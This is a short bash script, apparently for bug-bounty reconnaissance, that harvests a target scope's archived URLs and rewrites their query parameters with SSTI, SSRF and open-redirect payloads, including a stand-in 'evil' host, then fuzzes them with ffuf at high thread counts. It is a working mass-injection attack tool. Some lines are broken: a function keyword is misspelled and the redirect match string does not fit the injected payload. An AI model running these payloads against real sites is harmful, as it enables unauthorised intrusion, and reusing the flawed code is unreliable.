#!/bin/bash

function create_wl(){
mkdir -p url 
cd url 
#get urls
cat ../scope |waybackurls |tee -a url
cat ../scope |gau -subs |tee -a url 
cat url |sort -u -o url
#get url with parameters
cat url |grep  "=" |tee -a url.param
#create ssti template
cat url.param |qsreplace "ssti{{7*7}}" |tee -a url.ssti
cat url.ssti |sort -u -o url.ssti
#create ssrf template
cat url.param |qsreplace "http://$1"  |tee -a url.ssrf
cat url.ssrf |sort -u -o url.ssrf
#create open redirect template
cat url.param |qsreplace "http://evil"  |tee -a url.redirect
cat url.redirect |sort -u -o url.redirect
}

function ssti(){
ffuf -u FUZZ -w $1  -t 300  -mr "ssti49"  -o  ssti.result
}

functio open_redirect(){
ffuf -u FUZZ -w $1  -t 300  -mr "evil.com"  -o  open_redirect.result
}

function ssrf(){
ffuf -u FUZZ -w $1 -t 300 -o  ssrf.result
}

create_wl $1 
ssti ./url.ssti
ssrf ./url.ssrf
open_redirect  url.redirect
